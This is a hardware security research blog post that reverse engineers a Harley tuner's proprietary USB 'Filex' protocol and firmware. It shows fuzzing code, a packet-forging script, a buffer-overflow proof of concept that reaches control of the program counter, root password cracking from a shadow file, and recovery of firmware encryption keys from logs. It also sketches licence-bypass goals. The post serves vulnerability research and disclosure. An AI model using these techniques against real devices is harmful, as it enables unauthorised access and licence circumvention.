---
layout: post
tags: reverse hardware
title: Hacking a Harley's Tuner - Part 2
---

Reverse Engineering a famous Harley's tuner

**NOTE: All encryption keys and passwords are fake ones made up for writing this post.**


<div style="text-align: center;">
 <a href="/tags#system"><img src="{{ site.baseurl }}/icons/reverse.png" width="200" title="reverse" ></a>
 <a href="/tags#system"><img src="{{ site.baseurl }}/icons/system.png" width="200" title="system" ></a>
</div>


{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/Dynojet/buffer_overflow_crop.jpg)
{: refdef}

In the previous part, we ended up downloaded the full firmware unencrypted from the console connection. Now is time to show you what we have done with it.


# TLDR
- Buffer overflow in proprietary file exchange protocol: control of Program Counter, hard to reach a code execution because of input validation
- Command execution function left in the code, likely for debug purposes
- Firmware encryption keys, log encryption keys, and root password uncovering

## Part 1: The Filex Protocol
The Filex protocol is the name of the proprietary protocol used on the USB Link port. All the Windows softwares are actually using this Filex protocol through the USB Link, to configure the PowerVision. To do so, they have to use the PVLink.dll.
### 1.1 - Specification and KaitaiStruct

A simple packet looks like:


{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/Dynojet/hexview.png)
{: refdef}

We notice the delimiters (0xF0) and some kind of headers in little-endian.


{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/Dynojet/file_info.png)
{: refdef}

Here, on another example, we can see  a different function. This one is systematically called prior to any read, as it returns the file's size, which is used for the the actual read function.

After a few captures using [USBPcap](https://desowin.org/usbpcap/) as a Wireshark plugin, we started understanding the structure of the binary messages. Here is the parsing of the **DELETE-FILE**:

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/Dynojet/fields.png)
{: refdef}

And the full Kaitai Struct:
```yaml
seq:
  - id: start_byte
    size: 1
    contents: [0xf0]
  - id: type
    type: s4
    enum: type_value
  - id: param1
    type: s4
  - id: param2
    type: s4
  - id: datalen
    type: s4
  - id: seq
    type: s4
  - id: data
    size: datalen
    type: strz
    encoding: ASCII
  - id: checksum
    type: u1
  - id: end_byte
    size: 1
    contents: [0xf0]
```
The Kaitai Struct is quite simple, there is no nested data. 
- Delimiters: 0xF0 (start and end)
- Headers: 5 integers (32 bits) in Little Endian, , used for function types, parameters, data length, and a sequence number
- Data
- Checksum: 1 byte

Of course, to be able to shoot packets, we need to be able to generate valid checksums. But we do not need it yet, because we have an *API ready for use*.

### 1.2 - PVLink.dll

The good thing with DLL's is that they export symbols even if they are stripped.


{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/Dynojet/pvlink_funcs.png)
{: refdef}

The great thing here is that we can very quickly write our own code to use available functions used by the Windows tools. All we need is to plug the PowerVision, and use the PVLink.dll. The first thing any pentester has in mind when given a function that has file system read capacities is to browse what is accessible, and what is not. To do this, we used the **PVReadDir** function, and fuzzed the directories names using a directory list, like [this one](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-big.txt) for example. The corresponding C code:

```c
#include <stdlib.h>
#include <strings.h>
#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <dirent.h>

typedef int (*pvreadfile)(char*,char* , unsigned int ,int*);
typedef int (*pvreaddir)(char*, char*, int, int*);
typedef int (*pvgetsize)(char*, int*);
typedef int (*pvdosoap)(int, char*, char**, char*, int, int, int*, int*);

char *type(int t){
  switch(t){
  case 4:
    return "FOLDER: ";
  case 8:
    return "FILE: ";
  default:
    return "UNK: ";
  }
}

void read_dir(char *file){
  HMODULE hModule = LoadLibrary("PVLink.dll");
  pvreaddir readdir = (pvreaddir) GetProcAddress(hModule, "PVReadDir");
  char *dest = malloc(2048*sizeof(char));
  int mode = 0x400;
  int parm = 0;
  int res = readdir(file, dest, mode, &parm);
  // The PowerVision returns a directory structure with each field being a different file in the folder, separated by 132 bytes each
  // This loop is only made for parsing the PVReaddir response and show all the files in the folder
  for (int i=0;i<=parm;i++){
    printf("%s%s\n", type(*dest), dest+4);
    dest+=132;
  }
  free(dest);
 }
void brute_dir(){ 
  HMODULE hModule = LoadLibrary("PVLink.dll");
  pvreaddir readdir = (pvreaddir) GetProcAddress(hModule, "PVReadDir");
  char *dest = malloc(2048*sizeof(char));
  int mode = 0x400;
  int parm = 0;
  FILE* dlist = fopen("directory_list.txt", "r");
  char line[256];
  
  while (fgets(line, sizeof(line), dlist)) {
    strtok(line, "\n");
    strcat(line, ":");
    int res = readdir(line, dest, mode, &parm);
    if (res != 1009){
	printf("Read status=%d\nDirname=%s\n", res, line);
      }
    memset(file, 0, 64*sizeof(char));
  }
  free(dest);
  fclose(dlist);
}

int main(int argc, char **argv){
  read_dir("params:soap_resp");
  brute_dir();
  return 0;
}
```
Nothing exotic here, we just:
 - Load the DLL file using the *LoadLibrary* function
 - Locate the function we want to execute using the function's name and *dlsym*
 - Set the parameters to be roughly the same as seen in the USBPcap captures (except the ones we want to control)
 - Execute the call
 - Parse the returned structure using a dirty loop  
 
 
Here is a quick look at what the PVReadDir returned structure looks like:

```
    debug033:001D2828 db    8
    debug033:001D2829 db    0
    debug033:001D282A db    0
    debug033:001D282B db    0
    debug033:001D282C db  74h ; t
    debug033:001D282D db  65h ; e
    debug033:001D282E db  73h ; s
    debug033:001D282F db  74h ; t
    debug033:001D2830 db    0

- 8 is a file
   
    debug033:001D28AC db    4
    debug033:001D28AD db    0
    debug033:001D28AE db    0
    debug033:001D28AF db    0
    debug033:001D28B0 db  64h ; d
    debug033:001D28B1 db  79h ; y
    debug033:001D28B2 db  6Eh ; n
    debug033:001D28B3 db  6Fh ; o
    debug033:001D28B4 db  6Ah ; j
    debug033:001D28B5 db  65h ; e
    debug033:001D28B6 db  74h ; t
    debug033:001D28B7 db  5Fh ; _
    debug033:001D28B8 db  74h ; t
    debug033:001D28B9 db  75h ; u
    debug033:001D28BA db  6Eh ; n
    debug033:001D28BB db  65h ; e
    debug033:001D28BC db  73h ; s
    debug033:001D28BD db    0

- 4 is a folder
    
    debug033:001D269C db    4
    debug033:001D269D db    0
    debug033:001D269E db    0
    debug033:001D269F db    0
    debug033:001D26A0 db  2Eh ; .
    debug033:001D26A1 db  2Eh ; .
    debug033:001D26A2 db    0

- .. is a folder !!
```
Concerning the *mode* integer, I'm absolutely not sure it has anything to do with an actual mode (r, w), I just know the value it is supposed to be equal to from previous captures.  
Also, since then I've learned it is also quite simple to use a DLL with Python:

```python
from ctypes import *
def read_dir(path):
    pvlink = CDLL("./PVLink.dll")
    readdir = pvlink.PVReadDir
    nbfolders = c_int(0)
    mode = 0x400
    res = readdir(path, byref(dest), mode, byref(nbfolders))
    return res
```

I'm skipping a few details as I have been fuzzing many other functions and parameters. I'm only showing the attempts that had an interesting result. In the case of *PVReadDir*, we discovered the following directories:
 - updates: actually redirects to the root of accessible folders
 - params: only two files: *soap_req* and *soap_resp* used for querying a **SOAP API over serial port**
 - stock_bins: contains tunes files
 - logs: you can guess what is in there

The problem is that the format for files and folders access is **folder:file**, and you can't specify more than one folder. For example, the license file located in *updates/licenses/license.txt* is not accessible because you would have to write **updates:licenses:license.txt**.  
The Filex API is actually pretty well written and protects against read and writes in folders that the user is not supposed to access. But by fuzzing it a bit, we discovered two very interesting things:
 - A function available can actually execute a shell command on the PowerVision
 - The *CLEAN_PATH* function that protects against directory traversals contains a buffer overflow

### 1.3 - Function Types

From the examples in the KaitaiStruct part, we now know two function indexes:
 - 0x7: **DELETE_FILE**
 - 0x10: **FILE_INFO**
 But we can already guess that there are others. One problem now: to enumerate all indexes, we need to be able to forge packets. So we need to implement the checksum function.
 
 
{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/Dynojet/pvlink_funcs.png)
{: refdef}

The algorithm is quite simple:
 - A loop goes over all the bytes in the packet until the checksum offset and sums them up in a one byte register
 - XOR with 0xFF
 - If the checksum value is 0xF0, the is a conflict with the end of packet delimiter, and the checksum is replaced by 0xDB 0xDC
 Let's get to packet forging!  
 
Now we can iterate over all the possible function index values, and when we reached the function index **0x16**, we received a very interesting result from the PowerVision:
 ```
 Invalid cmd string
 ```
We liked that.  
This is quite common to see developper features left in products like this. Often the devs would need a quick shell access for debug. After many attempts, I did not succeed in executing any command. Something was off. Months later, when I got my hands on the firmware, I could then reverse the function supposed to execute the shell command:
 
```c
size_t __fastcall shell_cmd(int a1, int a2, const char *a3)
{
 
  if ( data_len < 1024 )
  {
    if ( data_len <= 0 )
    {

      v11 = *(_DWORD *)(v3 + 4);
      v12 = *(_DWORD *)(v3 + 8);
      *(_BYTE *)v6 = 0;
      result = log("TODO: shellcmd %d %u %s\n", v11, v12, &v14);
      *((_DWORD *)v5 + 1) = 0;
      return result;
     }
...
```

What do you mean, **TODO** ???  
It seems still that the function is actually implemented as we can see a call to **system** without any cross-reference:

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/Dynojet/system_xref.png)
{: refdef}

My guess would be they never changed the log message containing the **TODO**, but the CFILE_DO_COMMAND exists in the code. They probably just removed it's call from the release version.  

Anyway, after obtaining the firmware (see [part 1](https://therealunicornsecurity.github.io/Powervision-1/)), we finally obtained the full list of functions supported by the Filex protocol, and here the complete Kaitai Struct enums:

```yaml
enums:
  type_value:
    1: hello
    4: getinfo
    5: open_handle
    6: close_handle
    7: delete_file
    8: mkdir
    10: read_file
    11: write_file
    12: flush_handle
    13: open_dir
    14: read_dir
    15: close_dir
    16: file_info
    17: shell_cmd
    18: shutdown
    2: getseed
    3: sendkey
    9: filesync
```

### 1.4 - Buffer Overflow

We had started fuzzing the PVReadFile function without much success, apart from the directories we had discovered. We tried many path traversal patterns (using [dotdotpwn](https://github.com/wireghoul/dotdotpwn) ) but without any success. The reason for this is that the dunctions:
 - file_info
 - open_dir
 - delete_file
 - read_file
 - mkdir
 
all go through one **CLEAN_PATH** function. It checks for '\\', '/' and '..' patterns and stops if it encounters any of those. Then it compares the folder name (the string before the ':') against of white list of authorized folders:

```c
uint sanitize_path(int param_1,char *log_msg,int size,byte *param_path,int len,undefined *param_6)

{
  byte bVar1;
  char *path_:;
  char *pcVar2;
  int iVar3;
  uint uVar4;
  uint counter;
  char acStack175 [127];
  char parsed_path [20];
  
  *param_6 = 1;
  if (len < size) {
    counter = (uint)(0 < len);
    if (len < 1) {
LAB_0000b5d0:
      log_msg[counter] = '\0';
      path_: = strchr(log_msg,0x3a);
      if (path_: == (char *)0x0) {
        bVar1 = *(byte *)(param_1 + 4);
        if (bVar1 == 0) {
          log("CLEAN_PATH: Denying access to \'%s\'\n",log_msg);
          return (uint)bVar1;
        }
        log("CLEAN_PATH: Allowing access to \'%s\'\n",log_msg);
        *param_6 = 0;
        return 1;
      }
      pcVar2 = strchr(log_msg,0x5c);
      if ((pcVar2 != (char *)0x0) || (pcVar2 = strchr(log_msg,0x2f), pcVar2 != (char *)0x0)) {
        log("CLEAN_PATH: Slashes not allowed\n");
        return 0;
      }
      pcVar2 = strstr(log_msg,"..");
      if (pcVar2 != (char *)0x0) {
        log("CLEAN_PATH: \'..\' not allowed\n");
        return 0;
      }
```
Then it copies the folder name and file name in local variables using **strcpy**:

```c
      if (path_: + -(int)log_msg < (char *)0x10) {
        *path_: = '\0';
        strcpy(parsed_path,log_msg);
        strcpy(filename,path_: + 1);
```

This *if* checks for the length of the folder name, which is supposed to be under 16 bytes, so it is protected. However, the second **strcpy** does not check the length of the file's name! And according to Ghidra's stack frame, there is 127 bytes for the file's name's buffer. Now we need to get to debugging in order to see if we can exploit this.
#### 1.4.1 - Firmware emulation

At first we tried to run a gdb shell directly on the PowerVision device. Since it is a kernel in version 2.6.36, finding a statically precompiled GDB that wont return a 
```
Kernel too old
```
error message is nearly impossible. We thought of running an Ubuntu ARM 2.6.36 and compile GDB statically ourselves, but it seemed longer. Instead, we went for firmware emulation.

```bash
squashfs-root/gui/
├── arm7
│   ├── BobcatArm7-00.01.06.dde
│   └── bootloaderBobcat-00.01.02.dde
├── BobcatApp-arm
├── bobcat.ddskin
├── Bobcat-default.config
├── filex-server-arm
├── fx
├── harley.dbx
├── PVConditions-BigTwin.pvt
├── PVConditions-Street.pvt
├── PVConditions-VRod.pvt
├── splash
│   └── title_pv.tga
└── updaters
    ├── update.PVFIRMWARE1
    ├── update.PVGUI1
    ├── update.PVSKIN1
    └── update.PVTUNEDB1

```

In the previous part, we downloaded the firmware through the UBI blocks using the recovery shell. The directories structure above is a subset of files found in the **readonly** part of the firmware. The two most important binary files are **filex-server-arm**, that mostly handles the filex protocol over USB Link, and **BobcatApp-arm**, that contains all the Dynojet logic for bike tunes, licenses and logs.  

We ran the Linux [hardening-check](http://manpages.ubuntu.com/manpages/trusty/man1/hardening-check.1.html) tool on our firmware binaries:
```bash
filex_patch:
 Position Independent Executable: no, normal executable!
 Stack protected: no, not found!
 Fortify Source functions: no, only unprotected functions found!
 Read-only relocations: no, not found!
 Immediate binding: no, not found!
 Stack clash protection: unknown, no -fstack-clash-protection instructions found
 Control flow integrity: no, not found!
```

Of course, on an old 2.6.36 Linux, we were expecting this.   

We used the following command line to locally run the **filex-server-arm** binary:

```bash
$ qemu-arm -g 1234 -L squashfs-root/ filex-server-arm -V -s PHONYSERIALNUMBER
```

Gdb-server listens on localhost:1234, the directory *squashfs-root/lib* contains all the required shared object libraries, and we know which arguments are expected from the reversing the *main* function. 

Now that the arm binary is running in the background, we can debug it using *gdb-multiarch*. The process will read Filex messages from /dev/ttyGS0, so we created a named pipe using:
```bash
$ mknod squashfs-root/dev/ttyGS0 p
$ ls squashfs-root/dev/
squashfs-root/dev/
...
├── mtdblock0
...
├── random
├── tty
├── ttyGS0
├── ttyS0
├── ttyS1
├── ubi0
├── ubi0_0
├── ubi0_1
├── ubi0_2
├── ubi_ctrl
...
```

And while being debuged in GDB, we can shoot Filex using:

```bash
$ python filex_fuzzer.py > squashfs-root/dev/ttyGS0
```

Here is the code of the Kaitai generated python structure for Filex messages:

```python
from pkg_resources import parse_version
import kaitaistruct
from kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO
from enum import Enum


if parse_version(kaitaistruct.__version__) < parse_version('0.9'):
    raise Exception("Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s" % (kaitaistruct.__version__))

import struct


M8 = 0xffL
M32 = 0xffffffffL
def m32(n):
    return n & M32
def madd(a, b):
    return m32(a+b)
def msub(a, b):
    return m32(a-b)
def mls(a, b):
    return m32(a<<b)
def int322le(val):
    return struct.pack('<I', val)


class FilexMsg(KaitaiStruct):

    class TypeValue(Enum):
        hello = 1
        getseed = 2
        sendkey = 3
        getinfo = 4
        open_handle = 5
        close_handle = 6
        delete_file = 7
        mkdir = 8
        filesync = 9
        read_file = 10
        write_file = 11
        flush_handle = 12
        open_dir = 13
        read_dir = 14
        close_dir = 15
        file_info = 16
        shell_cmd = 17
        shutdown = 18

    def __init__(self, _parent=None, _root=None):
        self._parent = _parent
        self._root = _root if _root else self

    def fromfile(self, _io, _parent=None, _root=None):
        self._io = _io
        self._parent = _parent
        self._root = _root if _root else self
        self._read()

    def _read(self):
        self.start_byte = self._io.read_bytes(1)
        if not self.start_byte == b"\xF0":
            raise kaitaistruct.ValidationNotEqualError(b"\xF0", self.start_byte, self._io, u"/seq/0")
        self.type = KaitaiStream.resolve_enum(FilexMsg.TypeValue, self._io.read_s4le())
        self.param1 = self._io.read_s4le()
        self.param2 = self._io.read_s4le()
        self.datalen = self._io.read_s4le()
        self.seq = self._io.read_s4le()
        self.data = (KaitaiStream.bytes_terminate(self._io.read_bytes(self.datalen), 0, False)).decode(u"ASCII")
        self.checksum = self._io.read_u1()
        self.end_byte = self._io.read_bytes(1)
        if not self.end_byte == b"\xF0":
            raise kaitaistruct.ValidationNotEqualError(b"\xF0", self.end_byte, self._io, u"/seq/8")

    def gen(self, type_int, param1, param2, seqnum, length, data):
        self.start_byte = b"\xF0"
        self.type = type_int
        self.param1 = param1
        self.param2 = param2
        self.datalen = length
        self.seq = seqnum
        self.data = data
        self.checksum = 0
        self.end_byte = b"\xF0"

    def dump_hex(self):
        return self.start_byte.encode('hex') + int322le(self.type).encode('hex') + int322le(self.param1).encode('hex') + int322le(self.param2).encode('hex') + int322le(self.datalen).encode('hex') + int322le(self.seq).encode('hex') + self.data.encode('hex') + '{0:02x}'.format(self.checksum)  + self.end_byte.encode('hex')

#There has to be a better way to implement this one, but it works...
    def do_checksum(self):
        a = self.dump_hex().decode('hex')[1:-2]
        chk = 0
        for e in a:
            chk += int("0x"+e.encode('hex'), 16)
            chk = chk & M8
        res = (chk^0xFF)&M8
        res = madd(res, 1)&M8
        if res == 0xF0:
            return 0xD0
        self.checksum = res
        return res & M8
``` 

Using this exploit code:

```python
import kaitaistruct, enum, serial, os, subprocess
from filex_msg import FilexMsg




def build_path_exploit():
    op = FilexMsg()
    data = "updates:"+"A"*175
    op.gen(16, 1, 1, 13, len(data), data )
    chk = op.do_checksum()
    pkt = op.dump_hex().decode('hex')
    return pkt


if __name__=="__main__":    
    pkt = build_path_exploit()
    print pkt

```

We get:


{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/Dynojet/buffer_overflow_crop.jpg)
{: refdef}

So we can clearly see that we control the Program Counter register, which means we can change the execution flow to do something better than a **SIGSEGV**.  
Yet we encounter one last problem: there is a **charset** verification on what goes in the *filename* buffer. If a char is not contained between 0x20 or 0x7F, the function will enter an error case and the buffer will not be copied. Which is a shame because we have the perfect candidate for a pointer: the **CFILE_DO_COMMAND** function met earlier in 1.3! The problem is that it's adress contains hex values above 0x7F, and even the stack is loaded at addresses that can't be written in the buffer.
#### 1.4.2 - Conclusion

While the buffer overflow exists, we did not identify a way to execute code from it yet. We are open to suggestions if you have ideas, please feel free to submit then to us via our discord:
 - https://discord.gg/eTnPNTuCTZ
 
So far, we have tried:
 - Jumping to the .text: code starts around 0x9d18, so the first byte is already higher than 0x7F
 - Jumping to the stack: addresses are around 0xfffe... so same problem
 
## Part 2: Looting
### Root password
Since we can get the /etc/shadow file, we ran hashcat to get the root password of the device:

```
$ hashcat -a 3 -m 500 squashfs-root/etc/shadow ?l?l?l?l 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10710U CPU @ 1.10GHz, 13597/13661 MB (4096 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Brute-Force

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 67 MB

$1$SALT$HASH:PASS          
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$SALT$HASH
Time.Started.....: Tue Jan 19 10:53:35 2021 (6 secs)
Time.Estimated...: Tue Jan 19 10:53:41 2021 (0 secs)
Guess.Mask.......: ?l?l?l?l [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    34393 H/s (5.26ms) @ Accel:64 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 186624/456976 (40.84%)
Rejected.........: 0/186624 (0.00%)
Restore.Point....: 6912/17576 (39.33%)
Restore.Sub.#1...: Salt:0 Amplifier:8-9 Iteration:750-1000
Candidates.#1....: hdezi -> 6FYGvuy

Started: Tue Jan 19 10:53:33 2021
Stopped: Tue Jan 19 10:53:42 2021
```

After trying the whole *rockyou.txt* without any success, we tried with different mask attacks, and got one very interesting result: we found a matching password that was only 6 lowercase letters. Considering the amount of protections in place, I was quite surprised to find a matching root password so easily. Maybe it is an MD5 collision ?  
Anyway thanks to this, we don't have to go through the whole U-Boot/Recovery mode process to get a shell. Now we can connect directly using the internal UART Debug port:

```
ROMBoot
Welcome to bobcat
bobcat login: root
password:
# id
uid=0(root) gid=0(root)
#hellyeah
```

### Encryption Keys

After getting the root shell, we wanted to find our holy grail: the PVU_FILE encryption password. Grepping for OpenSSL calls in the *squashfs-root*, we found the following function in the **Bobcat-app-arm** binary:

```c
  memcpy(file,"/tmp/PVU_FILE",0xe);
  memcpy(password,&firm_key,0x20);
  local_1a0 = 0;
  sprintf(cmd_buffer,
          "unzip -p \'%s\' PVU_FILE | openssl enc -d -aes-256-cbc -salt -out %s -pass pass:",
          archive_name,file);
  strcat(cmd_buffer,password);
  system(cmd_buffer,0);
  cfile_sync();
  iVar3 = check_firmware_file(file);
  if (iVar3 == 0) {
    memcpy(err_file,"Missing package contents",0x19);
    return 0;
  }
```

Our password is a 32 bytes AES-256-CBC key. But reading the code above, we realize the password might be coming from one of the *.dbx* files.

```bash
$ binwalk -e harley.dbx
```

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/Dynojet/buffer_overflow_crop.jpg)
{: refdef}

Well those files look encrypted. But instead of playing cat and mouse with crypto keys, this time we had luck. The ubifs part of the firmware (read/write) contains logs files:

```bash
Dec 31 17:12:22 bobcat user.info BobcatApp: CFILE_DELETE: Deleting '/tmp/PVU_TYPE'
Dec 31 17:12:22 bobcat user.info BobcatApp: CFILE_DELETE: Deleting '/tmp/PVU_CERT'
Dec 31 17:12:22 bobcat user.info BobcatApp: CFILE_DELETE: Deleting '/tmp/PVU_FILE'
Dec 31 17:12:22 bobcat user.info BobcatApp: CFILE_SYNC: Performing sync...
Dec 31 17:12:22 bobcat user.info BobcatApp: CFILE_SYNC: Sync done.
Dec 31 17:12:22 bobcat user.info BobcatApp: CFILE_DO_COMMAND: unzip -o '/flash/storage/PV_TUNEDB-0.0.10.09.pvu' PVU_TYPE -d /tmp
Dec 31 17:12:28 bobcat user.info BobcatApp: CFILE_DO_COMMAND: Returned 0
Dec 31 17:12:28 bobcat user.info BobcatApp: CFILE_SYNC: Performing sync...
Dec 31 17:12:28 bobcat user.info BobcatApp: CFILE_SYNC: Sync done.
Dec 31 17:12:28 bobcat user.info BobcatApp: CFILE_DO_COMMAND: unzip -o '/flash/storage/PV_TUNEDB-0.0.10.09.pvu' PVU_CERT -d /tmp
Dec 31 17:12:34 bobcat user.info BobcatApp: CFILE_DO_COMMAND: Returned 0
Dec 31 17:12:34 bobcat user.info BobcatApp: CFILE_SYNC: Performing sync...
Dec 31 17:12:34 bobcat user.info BobcatApp: CFILE_SYNC: Sync done.
Dec 31 17:12:34 bobcat user.info BobcatApp: CFILE_DO_COMMAND: unzip -p '/flash/storage/PV_TUNEDB-0.0.10.09.pvu' PVU_FILE | openssl enc -d -aes-256-cbc -salt -out /tmp/PVU_FILE -pass pass:F6678H9Z9U8A7DHZDYCCUXH9SH2
Dec 31 17:13:15 bobcat user.info BobcatApp: CFILE_DO_COMMAND: Returned 0
```
Well. Nice! We found the holy grail!  
Also one fun thing to mention is that those log files are supposed to be encrypted:


```c
void encrypt_logs(undefined4 param_1)

{
  size_t sVar1;
  uint uVar2;
  char acStack1040 [1028];
  
  sprintf(acStack1040,"logread | openssl enc -aes-256-cbc -a -salt -out %s",param_1);
  sVar1 = strlen(acStack1040);
  acStack1040[sVar1 + 7] = 'p';
  acStack1040[sVar1 + 8] = acStack1040[sVar1 + 7] + -0xdf;
  acStack1040[sVar1 + 0xd] = acStack1040[sVar1 + 8] + '\xaa';
  acStack1040[sVar1 + 0x10] = acStack1040[sVar1 + 7] + -0x7c;
  acStack1040[sVar1 + 0x11] = acStack1040[sVar1 + 8] + -0x8d;
  acStack1040[sVar1 + 6] = acStack1040[sVar1 + 0x11] + -0x20;
  acStack1040[sVar1 + 0xf] = acStack1040[sVar1 + 8] + -0x94;
  acStack1040[sVar1 + 0xb] = acStack1040[sVar1 + 8] + -0x6e;
  acStack1040[sVar1 + 0xe] = acStack1040[sVar1 + 0xf] + '\x86';
  acStack1040[sVar1 + 9] = acStack1040[sVar1 + 8] + '\x78';
  acStack1040[sVar1 + 0x12] = acStack1040[sVar1 + 7] + -0x32;
  acStack1040[sVar1 + 5] = acStack1040[sVar1 + 0xb] + '12';
  acStack1040[sVar1] = acStack1040[sVar1 + 7] + -0x90;
  acStack1040[sVar1 + 3] = acStack1040[sVar1 + 5] + -0xfc;
  acStack1040[sVar1 + 0xc] = acStack1040[sVar1 + 0x10] + '?';
  acStack1040[sVar1 + 10] = acStack1040[sVar1 + 0xc] + '\x80';
  acStack1040[sVar1 + 1] = acStack1040[sVar1 + 0x11] + -12;
  acStack1040[sVar1 + 4] = acStack1040[sVar1 + 9];
  uVar2 = (uint)(byte)acStack1040[sVar1 + 0xf] + 0x70 & 0xff;
  acStack1040[sVar1 + 2] = (char)uVar2;
  log("Executing system command: %s\n",acStack1040,uVar2,(uint)(byte)acStack1040[sVar1 + 5]);
  system(acStack1040);
  sync();
  return;
}
```

The function generates a password with various sums, subtractions, and permutations. Finding the password here is just a matter of minutes. The obfuscation is quite weak. But that's not the best part. The original log files **are not deleted after being encrypted**. Which is probably the reason why we can find the firmware updates encryption keys in plaintext.

# Conclusion

We had a lot of fun doing this, but we would like to explore a few more mysterious things before calling it a day:
 - Encrypted databases: how to decrypt them
 - Forge firmwares and write it: either by writing directly to the ubi/mtd devices, or forging updates and bypassing the integrity check
 - License bypass: VIN unlock by patching firmware or replacing license signature keys
 
It was a long post, thanks for staying until the end and stay classy netsecurios!

---
Join our discord
https://discord.gg/eTnPNTuCTZ
---
